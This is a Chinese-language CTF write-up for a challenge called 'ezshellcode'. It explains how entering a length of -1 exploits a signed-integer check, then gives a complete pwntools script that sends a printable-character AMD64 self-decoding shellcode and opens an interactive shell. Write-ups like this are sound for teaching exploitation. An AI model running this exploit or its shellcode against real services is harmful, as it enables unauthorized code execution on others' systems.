# ezshellcode

## 题目简述

程序先读取 shellcode 长度，再按该长度接收并执行 shellcode。长度校验存在有符号整数问题：输入 `-1` 可以绕过正常上限并获得足够大的写入空间。同时，题目要求载荷全部由可见字符组成，因此不能直接发送常规的含零字节机器码。

## 解题过程

向长度提示输入 `-1`，利用负数在后续长度处理中的整数转换绕过限制。随后发送一段 AMD64 可打印字符 shellcode；这种载荷通过自解码逻辑在运行时还原真正的指令，因此传输阶段不含不可见字节。

官方题解给出的最小利用脚本如下。PDF 将长字节串换成了三行，实际发送前必须无分隔地拼接：

```python
from pwn import context, remote

context(log_level="debug", arch="amd64", os="linux")

HOST = "challenge.host"
PORT = 9999

io = remote(HOST, PORT)
io.sendlineafter(b"input the length of your shellcode:", b"-1")

shellcode = (
    b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H"
    b"0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1"
    b"n0J0h0a070t"
)
io.sendafter(b"input your shellcode:", shellcode)
io.interactive()
```

验证重点有两个：程序接受 `-1` 后仍继续读取载荷；发送的 `shellcode` 中每个字节都处于可见字符范围。若更换载荷，应先离线检查字节集合，并确认解码器不会依赖被过滤的字符。

## 方法总结

- 核心技巧：用负长度触发整数转换问题，再发送可打印字符自解码 shellcode。
- 识别信号：程序把用户提供的有符号长度用于无符号分配、比较或读取，同时对 shellcode 字节范围作限制。
- 复用要点：长度绕过和字符集约束是两个独立条件；长 shellcode 在 Markdown 中可以分段书写，但 Python 相邻字节串必须无缝拼接，不能混入 PDF 换行。
